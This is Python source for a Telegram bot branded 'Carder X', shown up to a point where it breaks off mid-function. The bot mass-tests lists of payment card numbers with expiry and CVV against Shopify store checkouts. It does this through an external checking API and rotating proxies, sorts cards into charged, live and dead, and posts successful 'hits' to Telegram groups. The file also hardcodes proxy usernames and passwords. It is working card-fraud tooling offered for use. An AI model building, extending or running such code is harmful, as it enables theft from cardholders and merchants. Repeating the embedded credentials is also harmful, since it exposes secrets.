import sys
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def _safe_print(*args, **kwargs):
    try:
        sys.stdout.write(" ".join(str(a) for a in args) + kwargs.get("end", "\n"))
        sys.stdout.flush()
    except Exception:
        pass

print = _safe_print

import asyncio
import aiohttp
import threading as _threading
import random
import re
import logging
import time
import string
import psycopg2.extras
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from collections import deque
from html import escape as html_escape

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from utils_send import safe_send_message, safe_send_animation
from aiogram.filters.callback_data import CallbackData

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, update_user_stats, get_db_connection, get_user_sites_db
from bin import get_bin_info
from sub import get_premium_status

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ADMIN_IDS = {6962534443, 8761005192, 8428369446}

CUSTOM_CHARGED_EMOJI_ID = "5343636681473935403"
CUSTOM_APPROVED_EMOJI_ID = "5039844895779455925"
CUSTOM_DECLINED_EMOJI_ID = "4915853119839011973"

BTN_CHARGED_EMOJI_ID = "5343636681473935403"
BTN_DEAD_EMOJI_ID = "4915853119839011973"
BTN_LIVE_EMOJI_ID = "5039844895779455925"
BTN_STOP_EMOJI_ID = "5040042498634810056"
BTN_ALL_EMOJI_ID = "5447602197439218445"

HIT_LOG_GROUP_ID = -1004479507133

EXTRA_CHARGED_GROUP_IDS = [-1004437051761, -1003934518771]

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS = {}
SESSION_LOCKS = {}

_MSH_HTTP_SESSION = None

def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=60),
            connector=aiohttp.TCPConnector(limit=1000, ssl=False)
        )
    return _MSH_HTTP_SESSION

_MSH_SESSION_MAX_AGE = 3600

def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()


router = Router()

try:
    from shopify_api import get_active_server, SHOPIFY_API_KEY, ALT_API_KEY, API_SERVERS
except ImportError:
    import sys
    sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
    from shopify_api import get_active_server, SHOPIFY_API_KEY, ALT_API_KEY, API_SERVERS


_BLACKLIST_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "blacklisted_sites.txt")

def _load_blacklist():
    if os.path.exists(_BLACKLIST_FILE):
        with open(_BLACKLIST_FILE, "r", encoding="utf-8", errors="ignore") as f:
            return set(line.strip() for line in f if line.strip())
    return set()

def _save_to_blacklist(site):
    with open(_BLACKLIST_FILE, "a", encoding="utf-8") as f:
        f.write(site.strip() + "\n")

GLOBAL_BLACKLISTED_SITES = _load_blacklist()

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

class ProxyManager:
    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PLACED', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway', 'empty psk', 'pasted_fields', '<b>Proxy Dead!</b>',
        'tokenization blocked: 403 Forbidden (proxy/IP blocked)'
    ]

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id = session_id
        self.raw_proxies = list(set(proxies_list))

        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]

        self.proxy_queue = deque(self.all_proxies)
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        self.cooldown_seconds = 60

        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}")

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None

        proxy = proxy.strip()

        if proxy.startswith(('http://', 'https://')):
            return proxy
        if proxy.startswith('socks5://'):
            return 'http://' + proxy[9:]

        if '@' in proxy and ':' in proxy.split('@')[0]:
            return f'http://{proxy}'

        parts = proxy.split()
        if len(parts) == 4:
            user, pwd, host, port = parts
            return f'http://{user}:{pwd}@{host}:{port}'

        if ':' in proxy and '@' not in proxy:
            parts = proxy.split(':')
            if len(parts) == 2 and parts[1].isdigit():
                return f'http://{proxy}'

        return f'http://{proxy}'

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False

        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2

        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)

            proxy = self.proxy_queue.popleft()

            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)

                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]

            self.proxy_queue.append(proxy)
            self.total_uses += 1

            return proxy, True

        if self.failed_proxies:
            best_proxy = min(
                self.failed_proxies.keys(),
                key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf'))
            )
            logging.warning(f"[ProxyManager] All proxies in cooldown, forcing {mask_proxy(best_proxy)}")
            self.total_uses += 1
            return best_proxy, True

        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        else:
            self.success_counts[proxy] = 1

        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''

        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False

        if '429' in response_lower or 'too many requests' in response_lower:
            return False

        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False

        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False

        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False

        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False

        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True

        return False

    def report_result(self, proxy: str, api_response: str, http_status: Optional[int] = None):
        current_time = time.time()

        if self.is_real_proxy_error(api_response, http_status):
            if proxy not in self.failed_proxies:
                self.failed_proxies[proxy] = {
                    'fail_count': 0,
                    'first_fail': current_time,
                    'last_fail': current_time,
                    'cooldown_until': 0
                }

            fail_data = self.failed_proxies[proxy]
            fail_data['fail_count'] += 1
            fail_data['last_fail'] = current_time

            fail_count = fail_data['fail_count']
            cooldown_multipliers = [30, 60, 120, 300, 600, 900, 1800]
            multiplier_index = min(fail_count - 1, len(cooldown_multipliers) - 1)
            cooldown_duration = cooldown_multipliers[multiplier_index]

            fail_data['cooldown_until'] = current_time + cooldown_duration

            logging.warning(
                f"[ProxyManager] Proxy FAILED (real error): {mask_proxy(proxy)} "
                f"(#{fail_count}) Cooldown: {cooldown_duration}s | Response: {api_response[:80]}"
            )
        else:
            self.report_success(proxy)
            logging.debug(
                f"[ProxyManager] Proxy OK: {mask_proxy(proxy)} | "
                f"Response: {api_response[:60]}"
            )

    def get_stats(self) -> dict:
        active_count = len([p for p in self.all_proxies if p not in self.failed_proxies])
        failed_count = len(self.failed_proxies)

        return {
            'total_proxies': len(self.all_proxies),
            'active': active_count,
            'failed': failed_count,
            'total_uses': self.total_uses,
            'success_distribution': dict(self.success_counts)
        }

    def get_available_count(self) -> int:
        current_time = time.time()
        available = 0
        for proxy in self.all_proxies:
            if proxy in self.failed_proxies:
                if current_time >= self.failed_proxies[proxy].get('cooldown_until', 0):
                    available += 1
            else:
                available += 1
        return available


def mask_proxy(proxy: str) -> str:
    try:
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                addr = parts[1]
                return f"***@{addr}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except:
        return "***"

def build_user_link(user_obj) -> str:
    name = html_escape(user_obj.first_name or "User")
    if user_obj.username:
        return f'<a href="https://t.me/{html_escape(user_obj.username)}">{name}</a>'
    return f'<a href="tg://user?id={user_obj.id}">{name}</a>'


def parse_card_details(card_string: str) -> Optional[Tuple[str, str, str, str]]:
    card_string = card_string.strip()
    patterns = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2})\/(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\|(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})$',
        r'^(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})$',
        r'^(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})$',
        r'^(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})$',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'^\/[a-zA-Z]+\s+(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]

    for pattern in patterns:
        match = re.search(pattern, card_string)
        if match:
            groups = match.groups()
            if len(groups) == 5 and pattern.startswith(r'^\/[a-zA-Z]+\s+'):
                cc, mm, yy, cvv = groups[1], groups[2], groups[3], groups[4]
            elif len(groups) == 4:
                cc, mm, yy, cvv = groups
            else:
                continue
            month = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, month, yy, cvv
    return None

def extract_cards_from_text(text: str) -> List[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\/\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
        r'(\d{13,19})\s*\/\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s\|\s*(\d{1,2})\s*\/\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s(\d{1,2})\/(\d{2,4})\s(\d{3,4})',
    ]
    cards = []
    for pattern in patterns:
        matches = re.findall(pattern, text)
        for match in matches:
            if len(match) == 4:
                card_number, month, year, cvv = match
                month = month.zfill(2)
                if len(year) == 4:
                    year = year[2:]
                card_string = f"{card_number}|{month}|{year}|{cvv}"
                if card_string not in cards:
                    cards.append(card_string)
    return cards

def log_hit_to_mshh(user_id, username, first_name):
    try:
        with open("mshh.txt", "a", encoding="utf-8") as f:
            u_name = username if username else "None"
            f_name = first_name if first_name else "Unknown"
            f.write(f"{user_id}|{u_name}|{f_name}\n")
    except Exception as e:
        logging.error(f"Error writing to mshh.txt: {e}")

RETRY_ERRORS = [
    'PAYMENTS_METHOD', 'no shipping handle obtained', 'validation_custom', 'decision_rule_block',
    'merchandise_expected_price_mismatch',
    'generic_error', 'generic error', 'error:', 'r4 token empty', 'payment method is not shopify!', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'invalid json in submit response', 'invalid json response', 'unknown result', 'site error! status: 401', 'payments_credit_card_generic',
    'payments_positive_amount_expected', 'inventoryreservationfailure',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login!', 'failed to get token',
    'no valid products', 'not shopify!', 'site not supported for now!',
    'connection error', 'connection error!', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'token not found', 'invalid_response', 'resolve', 'item', 'curl error',
    'could not resolve host', 'connect tunnel failed',
    'timeout', 'proxy error', 'http 429', '429', 'too many requests',
    'payment method not available', 'site not supported', 'captcha_required',
    'payments_credit_card_brand_not_supported', 'delivery_delivery_line_detail_changed',
    'delivery_no_delivery_strategy_available_for_mercha', 'delivery_no_delivery_strategy_available',
    'delivery_address', 'artifacts on the seller proposal', 'amount_too_small', '<b>Proxy Dead!</b>', 
    'tokenization blocked: 403 Forbidden (proxy/IP blocked)', 'stableId not found in checkout HTML', 'UNKNOWN', 
    'checkout GET', 'NO_PRODUCT_FOUND', 'found 1 products, all 1 checkouts returned site errors (CAPTCHA_METADATA_MISSING) (9.1s)',
     'TAX_NEW_TAX_MUST_BE_ACCEPTED', 'No receipt in submit response (type: TooManyRequests)',
    'step 0 failed',
    'step 1 failed',
    'step 2 failed',
    'step 3 failed',
    'step 4 failed',
    'step 5 failed',
    'step 6 failed',
    'step 7 failed',
    'step 8 failed',
    'step 9 failed',
    'step 10 failed',

    'no available products found',
    'could not extract receiptid',
    'could not extract signedhandles',
    'receiptid missing',
    'response missing receiptid',
    'products.json',
    'returned status 429',
    'returned status 500',
    'returned status 502',
    'returned status 503',
    'returned status 504',
    'store incompatible',
    'payments_payment_flexibility_terms_id_mismatch',
    'extract signedHandles',
    'missing receiptId',
    'no_product', 'no_shopify_payments_gateway', 'site_requires_login',
    'cart_failed', 'checkout_failed', 'tokenization_failed', 'negotiate_failed',
    'checkpointdenied', 'order_creation_failed', 'throttled',
    'no products found', 'graphql_error', 'session_expired',
    'no_session_token', 'no_attempt_token', 'no_seller_proposal',
    'merchant_account_closed', 'gateway_not_configured',
]

REACTIONS = [
    "airkiss", "blush", "brofist", "celebrate", "cheers", "clap",
    "cool", "cuddle", "dance", "handhold", "happy", "hug",
    "kiss", "laugh", "lick", "love", "nervous", "nom",
    "nuzzle", "nyah", "pat", "peek", "shy", "sip",
    "sleep", "smile", "smug", "sorry", "thumbsup",
    "tickle", "tired", "wave", "wink", "yay", "yes"
]

INSUFFICIENT_FUNDS_KEYWORDS = [
    "INSUFFICIENT",
    "NOT_ENOUGH_BALANCE",
    "NOT ENOUGH BALANCE",
    "LOW_BALANCE",
    "LOW BALANCE",
    "INSUFFICIENT_BALANCE",
    "INSUFFICIENT BALANCE",
]

OTHER_LIVE_KEYWORDS = [
    "INCORRECT_CVC", "INVALID_CVC", "INVALID_CVV", "CVC_DECLINED",
    "3DS_REQUIRED", "3DS REQUIRED", "OTP_REQUIRED", "OTP REQUIRED",
    "AUTHENTICATION_REQUIRED", "AUTHENTICATION REQUIRED",
    "INCORRECT_ZIP", "AVS_FAILED", "BILLING_ADDRESS_MISMATCH",
]

def is_session_stopped(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session:
        return True
    return session.get('status') == "STOPPED"

def is_buttons_locked(session_id: str) -> bool:
    session = MSH_SESSIONS.get(session_id)
    if not session: return False
    elapsed = time.time() - session.get('start_time', 0)
    return elapsed < BUTTON_LOCK_SECONDS

def get_remaining_lock(session_id: str) -> int:
    session = MSH_SESSIONS.get(session_id)
    if not session: return 0
    elapsed = time.time() - session.get('start_time', 0)
    remaining = BUTTON_LOCK_SECONDS - elapsed
    return max(0, int(remaining) + 1)

async def get_anime_gif():
    import aiohttp
    reaction = random.choice(REACTIONS)
    api_url = f"https://api.otakugifs.xyz/gif?reaction={reaction}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get("url")
    except Exception as e:
        logging.error(f"Error fetching anime gif: {e}")
    return "https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExM3Z6eXF6eXF6eXF6eXF6eXF6SZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/LdOyjZ7h5xS3yCjQ8I/giphy.gif"

async def get_user_plan_name(user_id):
    is_premium, _ = get_premium_status(user_id)
    if is_premium:
        try:
            def _sync_fetch():
                conn = get_db_connection()
                cursor = conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
                cursor.execute("SELECT plan FROM receipts WHERE user_id = %s ORDER BY purchased_on DESC LIMIT 1", (user_id,))
                row = cursor.fetchone()
                conn.close()
                if row:
                    p = row['plan'].lower()
                    if "root" in p: return '𝗥𝗼𝗼𝘁 <tg-emoji emoji-id="5039727497143387500">👑</tg-emoji>'
                    if "elite" in p: return "𝗘𝗹𝗶𝘁𝗲 <tg-emoji emoji-id='5278751923338490157'>⭐</tg-emoji>"
                    if "core" in p: return '𝗖𝗼𝗿𝗲 <tg-emoji emoji-id="5042274086332400375">🛠️</tg-emoji>'
                    return row['plan']
                return "PREMIUM"
            return await asyncio.to_thread(_sync_fetch)
        except Exception as e:
            logging.error(f"Error fetching plan name: {e}")
        return "PREMIUM"
    else:
        return "TRIAL"

DEFAULT_PROXIES = [
    "http://1351:IBd1Fk5CuUNZ@p103.squidproxies.com:9087",
    "http://1401:FVRHsSXw2DNK@p103.squidproxies.com:9238",
    "http://1439:jqvFsDEZ&%Sm@p102.squidproxies.com:9292",
    "http://1439:jqvFsDEZ&%Sm@p103.squidproxies.com:9291",
]

async def get_user_proxies(user_id):
    proxies = []
    try:
        def _sync_fetch():
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT proxy FROM proxies WHERE user_id = %s", (user_id,))
            rows = cursor.fetchall()
            conn.close()
            return [row[0] for row in rows]
        proxies = await asyncio.to_thread(_sync_fetch)
    except Exception as e:
        logging.error(f"Error fetching proxies for user {user_id}: {e}")
    if not proxies:
        proxies = DEFAULT_PROXIES[:]
    return proxies

def luhn_check(card_number: str) -> bool:
    card_number = str(card_number).strip()
    if not card_number.isdigit():
        return False
    total = 0
    reverse_digits = card_number[::-1]
    for i, char in enumerate(reverse_digits):
        digit = int(char)
        if i % 2 == 1:
            digit *= 2
            if digit > 9:
                digit -= 9
        total += digit
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        current_date = datetime.now()
        current_year = current_date.year % 100
        current_month = current_date.month
        exp_year = int(yy)
        exp_month = int(mm)
        if exp_year < current_year:
            return True
        elif exp_year == current_year:
            if exp_month < current_month:
                return True
        return False
    except ValueError:
        return True

def get_sites():
    sites = []
    try:
        sites_file = os.path.join(os.path.dirname(__file__), "sites.txt")
        if os.path.exists(sites_file):
            with open(sites_file, "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
        elif os.path.exists("sites.txt"):
            with open("sites.txt", "r", encoding="utf-8", errors="ignore") as f:
                sites = [line.strip() for line in f if line.strip()]
        
        banned_file = os.path.join(os.path.dirname(__file__), "banned_sites.json")
        if os.path.exists(banned_file):
            try:
                import json
                with open(banned_file, "r", encoding="utf-8") as bf:
                    banned = set(json.load(bf))
                    sites = [s for s in sites if s not in banned]
            except Exception as e:
                logging.error(f"Error reading banned_sites.json: {e}")
    except Exception as e:
        logging.error(f"Error reading sites.txt: {e}")
    return sites

def get_user_display(user_obj, plan_name):
    return f"{user_obj.first_name} ({plan_name})"

async def process_card_api(cc: str, mes: str, ano: str, cvv: str, site: str, proxy: str) -> Tuple[bool, str, str, str, str, str, str, int]:
    import aiohttp

    cc_formatted = f"{cc}|{mes}|{ano[-2:]}|{cvv}"
    api_proxy = proxy
    if api_proxy.startswith("http://"):
        api_proxy = api_proxy[7:]
    elif api_proxy.startswith("https://"):
        api_proxy = api_proxy[8:]
    elif api_proxy.startswith("socks5://"):
        api_proxy = api_proxy[9:]

    servers_to_try = [get_active_server()]
    for s in API_SERVERS:
        if s not in servers_to_try:
            servers_to_try.append(s)

    http_status = None
    last_error_msg = "Unknown Error"

    try:
        _http = _get_msh_http_session()
        for server in servers_to_try:
            current_api = f"{server}/shopify"
            for key in [SHOPIFY_API_KEY, ALT_API_KEY]:
                params = {
                    "site": site,
                    "cc": cc_formatted,
                    "proxy": api_proxy,
                    "key": key
                }
                try:
                    async with _http.get(current_api, params=params) as response:
                        http_status = response.status

                        if response.status == 200:
                            data = await response.json()

                            gateway = data.get("Gateway", "Shopify Payments")
                            price = data.get("Price", "0.00")
                            proxy_raw = data.get("Proxy", "Live")
                            api_response = data.get("Response", "Unknown Error")
                            status = data.get("Status", False)

                            if isinstance(status, str):
                                success = status.lower() == "true"
                            else:
                                success = bool(status)

                            if "live" in str(proxy_raw).lower():
                                proxy_status = "Live"
                            else:
                                proxy_status = "Dead"

                            return (
                                success,
                                api_response,
                                site,
                                gateway,
                                price,
                                "USD",
                                proxy_status,
                                http_status
                            )
                        elif response.status in (401, 403):
                            last_error_msg = f"API Auth Error: HTTP {response.status}"
                            continue
                        else:
                            last_error_msg = f"API Error: HTTP {response.status}"
                            break
                except asyncio.CancelledError:
                    raise
                except Exception as ex:
                    last_error_msg = str(ex)
                    break

        return (
            False,
            last_error_msg,
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            http_status
        )

    except asyncio.CancelledError:
        raise
    except aiohttp.ClientError as e:
        return (
            False,
            f"Connection Error: {str(e)}",
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            None
        )
    except Exception as e:
        return (
            False,
            f"Error: {str(e)}",
            site,
            "Shopify Payments",
            "0.00",
            "USD",
            "Error",
            None
        )

def generate_result_file(session: dict, result_type: str, user_obj, plan_name: str) -> Tuple[BytesIO, str, int]:
    cards_list = []

    if result_type == "charged":
        cards_list = session.get('charged_cards', [])
        type_label = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱"
        type_emoji = "💎"
    elif result_type == "live":
        cards_list = session.get('live_cards', [])
        type_label = "𝗟𝗶𝘃𝗲"
        type_emoji = "🎁"
    elif result_type == "dead":
        cards_list = session.get('dead_cards', [])
        type_label = "𝗗𝗲𝗮𝗱"
        type_emoji = "🚫"
    else:
        cards_list = (
            session.get('charged_cards', []) +
            session.get('live_cards', []) +
            session.get('dead_cards', []) +
            session.get('error_cards', [])
        )
        type_label = "𝗔𝗹𝗹"
        type_emoji = "📁"

    total_count = len(cards_list)
    user_display = get_user_display(user_obj, plan_name)

    lines = []
    lines.append("┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    lines.append("┃          CARDER X              ┃")
    lines.append("┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    lines.append("")
    lines.append(f"𝗥𝗲𝘀𝘂𝗹𝘁 𝗧𝘆𝗽𝗲 ➛ {type_label} {type_emoji}")
    lines.append(f"𝗧𝗼𝘁𝗮𝗹 𝗖𝗮𝗿𝗱𝘀 ➛ {total_count}")
    lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗜𝗙𝘆 𝗠𝗮𝘀𝘀")
    lines.append(f"𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 ➛ Carder X")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("")

    if total_count == 0:
        lines.append("⚠️ No cards found for this category")
    else:
        for card_data in cards_list:
            cc = card_data.get('card', 'N/A')
            response = card_data.get('response', 'N/A')
            bin_info = card_data.get('bin_info', {})
            price = card_data.get('price', 'N/A')

            scheme = bin_info.get('scheme', 'N/A')
            bank = bin_info.get('bank', 'N/A')
            country = bin_info.get('country', 'N/A')
            flag = bin_info.get('country_emoji', '')
            country_display = f"{flag} {country}" if flag else country

            if "CHARGED" in response or "ORDER_PLACED" in response:
                status = "𝗖𝗵𝗮𝗿𝗴𝗲𝗱 💎"
            elif "APPROVED" in response or "INVALID_CVC" in response or "INSUFFICIENT" in response or "3DS_REQUIRED" in response:
                status = "𝗔𝗣𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
            elif any(err in response for err in ["timeout", "connection error", "max retries", "json decode", "invalid api", "Unknown Error"]):
                status = "𝗘𝗥𝗥𝗢𝗥 ❌"
            else:
                status = "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ⚠️"

            lines.append(f"💎 𝗦𝘁𝗮𝘁𝘂𝘀 ➛ {status}")
            lines.append(f"💳 𝗖𝗮𝗿𝗱 ➛ {cc}")
            lines.append(f"🌐 𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ➛ 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 {price} 𝗨𝗦𝗗")
            lines.append(f"💬 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➛ {response}")
            lines.append(f"<tg-emoji emoji-id='6237822905128851025'>🆔</tg-emoji> 𝗕𝗿𝗮𝗻𝗱 ➛ {scheme}")
            lines.append(f"🏦 𝗜𝘀𝘀𝘂𝗲𝗿 ➛ {bank}")
            lines.append(f"📍 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 ➛ {country_display}")
            lines.append(f"👤 𝗨𝘀𝗲𝗿 ➛ {user_display}")
            lines.append(f"🐈‍⬛ 𝗗𝗲𝘃 ➛ Carder X")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            lines.append("")

    content = "\n".join(lines)
    content = re.sub(r'<tg-emoji[^>]*>(.*?)</tg-emoji>', r'\1', content)
    file_buffer = BytesIO(content.encode('utf-8'))
    file_buffer.seek(0)

    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    type_map = {"charged": "CHARGED", "live": "LIVE", "dead": "DEAD", "all": "ALL"}
    filename = f"CARDERX_{type_map.get(result_type, 'ALL')}_{timestamp}.txt"

    return file_buffer, filename, total_count

async def send_hit_log_to_group(bot: Bot, cc_formatted, response_msg, bin_data, user_obj, plan_name, proxy_status_formatted, price, site="Unknown Site", hit_type="CHARGED"):
    user_link = build_user_link(user_obj)
    gateway_display = html_escape(f"Shopify {price} USD")
    safe_response = html_escape(str(response_msg))
    dev_link = '<a href="https://t.me/Lanxo2">Carder X</a>'
    user_display = f"{user_link} ({plan_name})"
    safe_proxy = str(proxy_status_formatted)
    safe_site = html_escape(str(site))

    bin_scheme = html_escape(str(bin_data.get("scheme", "N/A")))
    bin_bank = html_escape(str(bin_data.get("bank", "N/A")))
    country_name = html_escape(str(bin_data.get("country", "N/A")))
    country_flag = bin_data.get("country_emoji", "")
    bin_country = f"{country_flag} {country_name}" if country_flag else country_name

    parts = str(cc_formatted).split('|')
